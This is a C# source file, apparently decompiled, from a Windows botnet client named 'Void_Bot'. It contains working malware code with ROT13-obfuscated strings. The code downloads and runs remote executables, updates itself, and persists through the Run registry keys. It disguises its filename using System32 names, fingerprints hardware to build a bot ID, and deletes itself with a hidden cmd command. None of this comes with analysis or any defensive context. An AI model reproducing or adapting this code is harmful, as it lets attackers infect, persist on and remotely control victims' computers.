using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Void_Bot.Core;

internal class Functions
{
	[Flags]
	private enum DockInfo
	{
		DOCKINFO_DOCKED = 2,
		DOCKINFO_UNDOCKED = 1,
		DOCKINFO_USER_SUPPLIED = 4,
		DOCKINFO_USER_DOCKED = 5,
		DOCKINFO_USER_UNDOCKED = 6
	}

	[StructLayout(LayoutKind.Sequential)]
	private class HW_PROFILE_INFO
	{
		[MarshalAs(UnmanagedType.U4)]
		public int dwDockInfo;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 39)]
		public string szHwProfileGuid;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
		public string szHwProfileName;
	}

	private struct SYSTEM_INFO
	{
		public short wProcessorArchitecture;

		public short wReserved;

		public int dwPageSize;

		public IntPtr lpMinimumApplicationAddress;

		public IntPtr lpMaximumApplicationAddress;

		public IntPtr dwActiveProcessorMask;

		public int dwNumberOfProcessors;

		public int dwProcessorType;

		public int dwAllocationGranularity;

		public short wProcessorLevel;

		public short wProcessorRevision;
	}

	private static Random _Random = new Random();

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetCurrentHwProfile(IntPtr lpHwProfileInfo);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetVolumeInformationA(string PathName, StringBuilder VolumeNameBuffer, int VolumeNameSize, ref int VolumeSerialNumber, ref int MaximumComponentLength, ref int FileSystemFlags, StringBuilder FileSystemNameBuffer, int FileSystemNameSize);

	[DllImport("kernel32.dll")]
	private static extern void GetNativeSystemInfo(ref SYSTEM_INFO lpSystemInfo);

	public static string GenerateRandomCharacters(int Count)
	{
		string text = Cryptography.ROT13("nopqrstuvwxyzabcdefghijklm");
		string text2 = string.Empty;
		for (int i = 0; i < Count; i++)
		{
			text2 += text[_Random.Next(text.Length)];
		}
		return text2;
	}

	public static string GetLocale()
	{
		return RegionInfo.CurrentRegion.TwoLetterISORegionName.ToString();
	}

	public static string GetOSName()
	{
		string result = Cryptography.ROT13("Haxabja");
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			if (oSVersion.Platform == PlatformID.Win32NT)
			{
				if (oSVersion.Version.Major == 5)
				{
					int minor = oSVersion.Version.Minor;
					if (minor == 1)
					{
						result = Cryptography.ROT13("Jvaqbjf KC");
						return result;
					}
					return result;
				}
				if (oSVersion.Version.Major == 6)
				{
					switch (oSVersion.Version.Minor)
					{
					case 0:
						result = Cryptography.ROT13("Jvaqbjf Ivfgn");
						return result;
					case 1:
						result = Cryptography.ROT13("Jvaqbjf 7");
						return result;
					case 2:
						result = Cryptography.ROT13("Jvaqbjf 8");
						return result;
					default:
						return result;
					}
				}
				return result;
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static string GetPlatform()
	{
		string result = Cryptography.ROT13("k86");
		if (GetOSName() != Cryptography.ROT13("Jvaqbjf KC"))
		{
			SYSTEM_INFO lpSystemInfo = default(SYSTEM_INFO);
			GetNativeSystemInfo(ref lpSystemInfo);
			switch (lpSystemInfo.wProcessorArchitecture)
			{
			case 9:
				result = Cryptography.ROT13("k86");
				break;
			case 6:
				result = Cryptography.ROT13("k64");
				break;
			case 0:
				result = Cryptography.ROT13("k86");
				break;
			}
		}
		return result;
	}

	public static string DownloadFile(string URL, string Extension, bool Execute)
	{
		if (!string.IsNullOrEmpty(URL))
		{
			if (!URL.Contains(Cryptography.ROT13("uggs://")) && !URL.Contains(Cryptography.ROT13("uggsf://")))
			{
				URL = Cryptography.ROT13("uggs://") + URL;
			}
			try
			{
				string text = Path.Combine(Path.GetTempPath(), GenerateRandomCharacters(7) + "." + Extension);
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile(URL, text);
				}
				if (File.Exists(text))
				{
					if (Execute)
					{
						Win32.STARTUPINFO lpStartupInfo = default(Win32.STARTUPINFO);
						Win32.PROCESS_INFORMATION lpProcessInformation = default(Win32.PROCESS_INFORMATION);
						Win32.CreateProcess(text, null, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 0u, IntPtr.Zero, null, ref lpStartupInfo, out lpProcessInformation);
					}
					return text;
				}
			}
			catch
			{
			}
		}
		return Config.Const_FunctionError;
	}

	public static FileStream GetFileStream(string Path)
	{
		return new FileStream(Path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
	}

	public static bool UpdateBot(string URL)
	{
		string text = DownloadFile(URL, Cryptography.ROT13("rkr"), Execute: false);
		if (text != Config.Const_FunctionError)
		{
			string fileMD = Cryptography.GetFileMD5(text);
			if (fileMD != Config.BotData_MD5)
			{
				Win32.STARTUPINFO lpStartupInfo = default(Win32.STARTUPINFO);
				Win32.PROCESS_INFORMATION lpProcessInformation = default(Win32.PROCESS_INFORMATION);
				Win32.CreateProcess(text, null, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 0u, IntPtr.Zero, null, ref lpStartupInfo, out lpProcessInformation);
				UninstallBot();
			}
		}
		return false;
	}

	public static bool IsAdmin()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return false;
		}
		return true;
	}

	public static string GenerateMutex()
	{
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.BotData_MD5)).ToUpper();
		if (text.Length > 10)
		{
			text = text.Substring(0, 8);
		}
		return text;
	}

	public static void CheckMutex()
	{
		try
		{
			bool createdNew = false;
			new Mutex(initiallyOwned: true, GenerateMutex(), out createdNew);
			if (!createdNew)
			{
				Environment.Exit(0);
			}
		}
		catch
		{
			Environment.Exit(0);
		}
	}

	public static RegistryKey GenerateRegistryPath()
	{
		RegistryKey result = null;
		try
		{
			result = Registry.CurrentUser.OpenSubKey(Cryptography.ROT13("Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha"), writable: true);
		}
		catch
		{
		}
		if (Config.Environment_IsAdmin)
		{
			try
			{
				Registry.LocalMachine.OpenSubKey(Cryptography.ROT13("Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha"), writable: true)!.SetValue(Config.BotData_RegistryValueName, Config.BotData_Path);
				Config.Environment_RegistryLocation = Cryptography.ROT13("UXYZ");
				result = Registry.LocalMachine.OpenSubKey(Cryptography.ROT13("Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha"), writable: true);
				return result;
			}
			catch
			{
				return result;
			}
		}
		return result;
	}

	public static void UninstallBot()
	{
		try
		{
			GenerateRegistryPath().DeleteValue(Config.BotData_RegistryValueName);
			File.SetAttributes(Config.BotData_Path, FileAttributes.Normal);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = Cryptography.ROT13("/P pubvpr /P L /A /Q L /G 3 & Qry ") + Config.BotData_Path;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = Cryptography.ROT13("pzq.rkr");
			Process.Start(processStartInfo);
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static string GenerateBotFilename()
	{
		string empty = string.Empty;
		try
		{
			string[] files = Directory.GetFiles(Environment.GetEnvironmentVariable(Cryptography.ROT13("JVAQVE")) + Cryptography.ROT13("\\flfgrz32"));
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(files[_Random.Next(0, files.Length)]);
			string text = fileNameWithoutExtension.Substring(0, fileNameWithoutExtension.Length / 2);
			string fileNameWithoutExtension2 = Path.GetFileNameWithoutExtension(files[_Random.Next(0, files.Length)]);
			string text2 = fileNameWithoutExtension2.Substring(0, fileNameWithoutExtension2.Length / 2);
			return text + text2 + Cryptography.ROT13(".rkr");
		}
		catch
		{
			return GenerateRandomCharacters(7) + Cryptography.ROT13(".rkr");
		}
	}

	public static string GenerateBotID()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(Cryptography.ROT13("jva32_cebprffbe"));
		ManagementObjectCollection instances = val.GetInstances();
		try
		{
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (string.IsNullOrEmpty(text))
					{
						text = ((ManagementBaseObject)val2).get_Properties().get_Item(Cryptography.ROT13("cebprffbeVQ")).get_Value()
							.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		string text2 = string.Empty;
		HW_PROFILE_INFO hW_PROFILE_INFO = null;
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			hW_PROFILE_INFO = new HW_PROFILE_INFO();
			intPtr = Marshal.AllocHGlobal(Marshal.SizeOf((object)hW_PROFILE_INFO));
			Marshal.StructureToPtr((object)hW_PROFILE_INFO, intPtr, fDeleteOld: false);
			if (GetCurrentHwProfile(intPtr))
			{
				Marshal.PtrToStructure(intPtr, (object)hW_PROFILE_INFO);
				text2 = hW_PROFILE_INFO.szHwProfileGuid;
			}
		}
		catch
		{
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
		return Cryptography.GetStringMD5(text + text2);
	}
}
